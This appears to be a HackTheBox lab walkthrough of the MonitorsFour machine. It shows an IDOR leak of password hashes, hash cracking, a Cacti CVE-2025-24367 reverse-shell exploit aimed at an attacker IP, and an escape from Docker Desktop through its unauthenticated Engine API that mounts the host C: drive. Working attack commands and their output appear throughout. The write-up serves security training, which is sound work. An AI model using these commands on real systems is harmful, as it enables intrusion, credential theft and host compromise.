---
title: HTB MonitorsFour Walkthrough
date: 2026-06-01
categories: [HackTheBox] 
tags: [hackthebox, cacti, docker, idor, windows] 
---

---

## **Introduction**

> **Difficulty:** Easy <br>
> **Platform:** HackTheBox <br>
> **Operating System:** Windows <br>
> **Techniques:** IDOR, Hash Cracking, Authenticated RCE, Docker Escape

![Banner](/assets/img/posts/monitorsfour/banner.png)

MonitorsFour is an easy-rated Windows machine on HackTheBox focused on web application enumeration, insecure API design, and container escape techniques. The attack chain starts with the discovery of a vulnerable API endpoint affected by improper access control, which exposes sensitive user information including MD5 password hashes. After cracking the leaked credentials, authenticated access to a vulnerable Cacti instance leads to remote code execution inside a Docker container. Finally, an exposed Docker Engine API is abused to escape the containerized environment and compromise the underlying Windows host.

Throughout the machine, we encounter several realistic attack vectors commonly seen in modern environments:

* API enumeration and endpoint fuzzing
* Exploiting IDOR vulnerabilities
* Password hash cracking with Hashcat
* Authenticated RCE in Cacti
* Docker container enumeration and escape
* Abuse of exposed Docker Engine APIs

Rather than relying on a single vulnerability, MonitorsFour demonstrates how multiple smaller weaknesses can be chained together into full system compromise.

---

## **Attack Overview**

The overall attack path for this machine follows a fairly realistic progression:

```
Recon → API Discovery → IDOR → Hash Cracking
        ↓
   Cacti Access → RCE → Docker Escape → SYSTEM
```
---

## **Reconnaissance**

We begin the reconnaissance phase with an Nmap scan to identify open ports and running services on the target machine.

```bash
nmap -sC -sV <TARGET-IP>
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-01 00:21 +0530
Nmap scan report for monitorsfour.htb (TARGET-IP)
Host is up (0.25s latency).
Not shown: 998 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MonitorsFour - Networking Solutions

5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan reveals two interesting ports:

| Port | Service      | Description                            |
| ---- | ------------ | -------------------------------------- |
| 80   | HTTP (nginx) | Hosts the MonitorsFour web application |
| 5985 | WinRM        | Windows Remote Management service      |

The presence of WinRM strongly suggests that the backend operating system is Windows, while the web server is running through `nginx`. Another interesting observation is that the application sets a `PHPSESSID` cookie without the `HttpOnly` flag enabled, which could potentially expose session cookies to client-side attacks.

Since the application relies on virtual hosting, we add the domain mapping to `/etc/hosts` so the site resolves correctly locally.


```bash
echo "<TARGET-IP> monitorsfour.htb" | sudo tee -a /etc/hosts
```

Visiting the website on port 80 presents us with a networking solutions themed web application named **MonitorsFour**. Since the application appears fairly minimal at first glance, further web enumeration becomes the next logical step.

![Homepage](/assets/img/posts/monitorsfour/2homepage.png)

### **Subdomain Discovery**

After browsing the main website, it appeared to be mostly a simple landing page with static content and no immediately obvious attack surface. In situations like this, enumerating subdomains is often a useful next step, since applications such as admin portals, monitoring dashboards, development environments, or internal services are commonly hosted separately and may expose additional functionality.

To search for virtual hosts, we use `ffuf` with a subdomain wordlist while fuzzing the `Host` header.


```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://monitorsfour.htb \
-H "Host: FUZZ.monitorsfour.htb" -ac
```

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 291ms]

:: Progress: [4989/4989] :: Job [1/1] :: 135 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

The scan reveals a new subdomain:

```text
cacti.monitorsfour.htb
```

Since the response returned a `302` redirect, it indicates that the subdomain is active and hosting a web application. We then add the newly discovered subdomain to our `/etc/hosts` file before accessing it through the browser.

```bash
echo "<TARGET-IP> cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

![Cacti Homepage](/assets/img/posts/monitorsfour/3cacti_homepage.png)

### **Obtaining Credentials via IDOR**

Since the newly discovered Cacti instance required authentication, the next step was to continue enumerating the main website for additional functionality and hidden API endpoints.

To do this, we perform API endpoint fuzzing using `ffuf` along with a common API wordlist.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-u http://monitorsfour.htb/FUZZ -ac
```

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api/v1/auth             [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 318ms]
api/v1/user             [Status: 200, Size: 35, Words: 3, Lines: 1, Duration: 201ms]

:: Progress: [269/269] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

The scan reveals two interesting API endpoints:

* `api/v1/auth`
* `api/v1/user`

The `/api/v1/user` endpoint appears especially interesting since it accepts a `token` parameter. When testing APIs for insecure access control or IDOR vulnerabilities, it is usually worth trying common edge-case values such as `0`, `1`, negative numbers, or empty parameters to observe how the application handles them.

In this case, sending `token=0` causes the application to behave unexpectedly and return a complete list of users instead of restricting access to a single account. The response also exposes MD5 password hashes for multiple users, confirming that the endpoint suffers from improper authorization checks and insecure direct object reference behavior.

To confirm the vulnerability, we manually query the endpoint using `curl` and supply the `token=0` parameter.

```bash
curl -s "http://monitorsfour.htb/user?token=0" | jq
```

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer"
  }
]
```

The response exposes sensitive information for multiple users, including email addresses, authentication tokens, and password hashes. The administrator account immediately stands out:

```text
admin : 56b32eb43e6f15395f6c46c1c9e1cd36
```

The hash format appears to be MD5, which is considered outdated and relatively easy to crack using common wordlists. We save the hash into a file and use `hashcat` together with the `rockyou.txt` wordlist.

```bash
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > hash.txt

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

After a short amount of time, the password is successfully recovered:

```text
56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1
```

At this point, we now have valid credentials that can potentially be reused against other services discovered during enumeration.

---

## **Foothold**

After adding the newly discovered subdomain to `/etc/hosts`, we navigate to:

```text
http://cacti.monitorsfour.htb
```

The page presents a login portal for **Cacti**, a popular open-source network monitoring and graphing platform. At the bottom of the login page, the application version is disclosed as:

```text
Cacti Version 1.2.28
```

At this stage, we already possess credentials recovered from the vulnerable API endpoint:

```text
admin : wonderful1
```

However, attempting to authenticate with these credentials does not succeed. Looking back at the leaked user information, we notice that the administrator account belongs to **Marcus Higgins**, suggesting that the application may be using a different username internally.

Using the credentials:

```text
marcus : wonderful1
```

successfully grants access to the Cacti dashboard.

![Cacti Login](/assets/img/posts/monitorsfour/4cacti_login.png)

With authenticated access to a specific Cacti version, the next logical step is to search for publicly known vulnerabilities affecting **Cacti 1.2.28**. A quick search reveals the following security advisory:

```text
https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq
```

![Cacti Google](/assets/img/posts/monitorsfour/5cacti_google.png)

The advisory describes **CVE-2025-24367**, an authenticated remote code execution vulnerability affecting vulnerable Cacti installations. The issue allows authenticated users to abuse graph and template functionality in order to write arbitrary PHP files into the web root, ultimately leading to code execution on the server.

A public proof-of-concept is also available:

```text
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
```

Since we already have valid credentials for the application, this vulnerability provides a direct path to obtaining remote code execution on the target system.

---

## **Initial Foothold**

To exploit the vulnerability, we first clone the public proof-of-concept exploit from GitHub and move into the project directory.

```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git

cd CVE-2025-24367-Cacti-PoC
```

Before running the exploit, we start a Netcat listener to catch the reverse shell connection from the target.

```bash
nc -lvnp 4444
```

With the listener active, we execute the exploit using the credentials obtained earlier.

```bash
python3 exploit.py -u marcus -p wonderful1 -i <ATTACKER-IP> -l 4444 -url http://cacti.monitorsfour.htb
```

```text
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: ALjy6.php
[+] Got payload: /bash
[i] Created PHP filename: JWLPj.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

Returning to the Netcat listener, we successfully receive a reverse shell from the target machine.

![Rev Shell](/assets/img/posts/monitorsfour/rev_shell.png)

The hostname format immediately suggests that we are inside a Docker container rather than directly on the Windows host system. We now have command execution as the `www-data` user within the vulnerable Cacti environment.

After obtaining the reverse shell, we begin enumerating the environment to understand our current privileges and identify potential paths for further access.

We first verify the current user context.

```bash 
id
```

```text 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell confirms that we are running as the `www-data` user inside the vulnerable Cacti application.

Next, we inspect the `/home` directory to identify available users on the system.

```bash 
ls -la /home
```

```text 
total 16
drwxr-xr-x 1 root   root   4096 Nov 10  2025 .
drwxr-xr-x 1 root   root   4096 May 31 19:51 ..
drwxr-xr-x 1 marcus marcus 4096 May 31 18:16 marcus
```

A user named `marcus` exists on the system, so we enumerate the contents of the home directory.

```bash 
ls -la /home/marcus
```

```text 
total 28
drwxr-xr-x 1 marcus marcus 4096 May 31 18:16 .
drwxr-xr-x 1 root   root   4096 Nov 10  2025 ..
-rw-r--r-- 1 marcus marcus  220 Jul 30  2025 .bash_logout
-rw-r--r-- 1 marcus marcus 3526 Jul 30  2025 .bashrc
-rw-r--r-- 1 marcus marcus  807 Jul 30  2025 .profile
-r-xr-xr-x 1 root   root     34 May 31 18:13 user.txt
```

The user flag is readable, allowing us to retrieve it directly.

```bash
cat /home/marcus/user.txt
<REDACTED-FLAG>
```

At this stage, we have successfully obtained the user flag. The next objective is to escape the Docker container and gain access to the underlying Windows host system.

---

## **Privilege Escalation**

### **Container Enumeration**

After obtaining the user flag, we begin enumerating the environment to understand where our shell is running and identify possible paths for privilege escalation.

The hostname immediately appears unusual and resembles the randomly generated identifiers commonly associated with Docker containers.

```bash
hostname
```

```text
821fbd6a43fa
```

To confirm this suspicion, we inspect the root filesystem.

```bash
ls -la /
```

```text
total 84
drwxr-xr-x   1 root root  4096 May 31 20:06 .
drwxr-xr-x   1 root root  4096 May 31 20:06 ..
-rwxr-xr-x   1 root root     0 Nov 10  2025 .dockerenv
```

The presence of the `.dockerenv` file confirms that we are operating inside a Docker container rather than directly on the Windows host.

At this stage, we return to the main `monitorsfour.htb` application and continue inspecting the authenticated functionality available through the dashboard. While browsing through the application, the **Changelog** section reveals an interesting infrastructure notice.

![MonitorsFour Homepage](/assets/img/posts/monitorsfour/6monitorsfour_homepage.png)

The page explicitly states that the backend infrastructure was migrated to:

```text
Docker Desktop 4.44.2
```

![MonitorsFour Changelog](/assets/img/posts/monitorsfour/7monitorsfour_changelog.png)

The application also mentions that the services were containerized and deployed through Docker Desktop, which aligns perfectly with the evidence gathered from our shell enumeration.

This information becomes extremely important, since it gives us both:

* confirmation that Docker Desktop is being used on the host,
* and the exact version number running in the environment.

With confirmed Docker usage and an exact version disclosure, researching vulnerabilities affecting Docker Desktop `4.44.2` becomes the next logical step.

Researching vulnerabilities affecting Docker Desktop `4.44.2` quickly leads us to **CVE-2025-9074**, a container escape vulnerability affecting Docker Desktop environments on Windows.

![Docker Google](/assets/img/posts/monitorsfour/8docker_google.png)

The vulnerability allows containers with network access to communicate directly with the internal Docker Engine API without authentication. In practice, this means that a compromised container may be able to create new containers, mount host directories, and execute commands on the underlying host system.

The exposed Docker API is typically reachable at:

```text
192.168.65.7:2375
```

This becomes especially dangerous because Docker Desktop internally exposes Windows drives through special mount paths such as:

```text
/run/desktop/mnt/host/c/
```

As a result, if we can successfully interact with the Docker daemon, we may be able to mount the host `C:` drive into a new container and access sensitive files directly from the Windows host.

Since we already have command execution inside the compromised Cacti container, this vulnerability provides a clear path toward escaping the containerized environment and accessing the underlying host system.

Before interacting further with the Docker API, we first upgrade our shell into a more stable pseudo-terminal to improve command execution and output handling.

```bash 
script /dev/null -c /bin/bash
```

```text 
Script started, output log file is '/dev/null'.
```

This gives us a cleaner interactive shell, making it easier to work with multiline commands and interact with the Docker API during the container escape process.

To verify whether the Docker API is actually accessible from inside the container, we send a request to the exposed Docker Engine endpoint.

```bash
curl http://192.168.65.7:2375/version
```

The request succeeds and returns detailed information about the Docker Engine running on the host.

```json
{
  "Platform": {
    "Name": "Docker Engine - Community"
  },
  "Components": [
    {
      "Name": "Engine",
      "Version": "28.3.2",
      "Details": {
        "ApiVersion": "1.51",
        "Arch": "amd64",
        "BuildTime": "2025-07-09T16:13:55.000000000+00:00",
        "Experimental": "false",
        "GitCommit": "e77ff99",
        "GoVersion": "go1.24.5",
        "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
        "MinAPIVersion": "1.24",
        "Os": "linux"
      }
    },
    {
      "Name": "containerd",
      "Version": "1.7.27"
    },
    {
      "Name": "runc",
      "Version": "1.2.5"
    }
  ],
  "Version": "28.3.2",
  "ApiVersion": "1.51",
  "Os": "linux",
  "Arch": "amd64",
  "KernelVersion": "6.6.87.2-microsoft-standard-WSL2"
}
```

This confirms that the Docker daemon is fully reachable from inside the compromised container without authentication. More importantly, the response reveals that the host is running through **WSL2-backed Docker Desktop**, which aligns with the infrastructure notice discovered earlier in the application changelog.

Since we can directly communicate with the Docker Engine API, we can now attempt to create new containers with mounted access to the underlying Windows filesystem.

## **Docker Escape**

Because the Docker daemon is exposed without authentication, any container with network access to the API can directly issue Docker management commands to the host daemon itself.

This effectively allows us to:

* create new containers,
* mount host directories,
* and execute commands on the underlying host system.

In Docker Desktop environments, the Windows `C:` drive becomes accessible from Linux containers through the following internal mount path:

```text
/run/desktop/mnt/host/c/
```

If we can create our own container and mount this directory inside it, we can directly access files from the Windows host.

To achieve this, we send a POST request to the Docker API endpoint responsible for container creation.

```bash
curl -s -X POST "http://192.168.65.7:2375/containers/create" -H "Content-Type: application/json" -d '{"Image":"alpine","Tty":true,"Cmd":["sh","-c","cat /mnt/users/administrator/desktop/root.txt"],"HostConfig":{"Binds":["/run/desktop/mnt/host/c/:/mnt"]}}'
```

```text
{"Id":"b8cd270492599c6442f53b03be9605cebd0d1122547c8e55d53d32b45e1dbd62","Warnings":[]}
```

The request succeeds and the Docker daemon returns the ID of the newly created container.

The container configuration instructs Docker to:

* create a new Alpine container,
* mount the Windows `C:` drive under `/mnt`,
* and execute the following command inside the container:

```text
cat /mnt/users/administrator/desktop/root.txt
```

Next, we save the container ID into a variable, start the container, and retrieve its logs through the Docker API.

```bash
www-data@821fbd6a43fa:~/html/cacti$ id="b8cd270492599c6442f53b03be9605cebd0d1122547c8e55d53d32b45e1dbd62"
www-data@821fbd6a43fa:~/html/cacti$ curl -s -X POST http://192.168.65.7:2375/containers/$id/start
www-data@821fbd6a43fa:~/html/cacti$ curl -s "http://192.168.65.7:2375/containers/$id/logs?stdout=1&stderr=1"
<REDACTED-FLAG>
www-data@821fbd6a43fa:~/html/cacti$
```

With this, we successfully abuse the exposed Docker Engine API to escape the containerized environment and gain access to sensitive files on the underlying Windows host. What initially began as a vulnerable web application ultimately led to full system compromise through insecure Docker Desktop exposure and improper container isolation.

![End](/assets/img/posts/monitorsfour/1intro.jpeg)

---

## **Conclusion**

MonitorsFour was an excellent machine focused on modern web exploitation and container security weaknesses. The attack chain combined API abuse, insecure authentication logic, authenticated RCE in Cacti, and ultimately Docker container escape through an exposed Docker Engine API.

Key takeaways from this machine include:

* the dangers of improper API authorization checks,
* risks introduced by weak hash storage such as MD5,
* how exposed management interfaces can completely break container isolation,
* and why Docker Desktop environments should never expose the Docker daemon to untrusted containers.

Overall, this machine provided a realistic demonstration of how multiple smaller misconfigurations can be chained together into full system compromise.
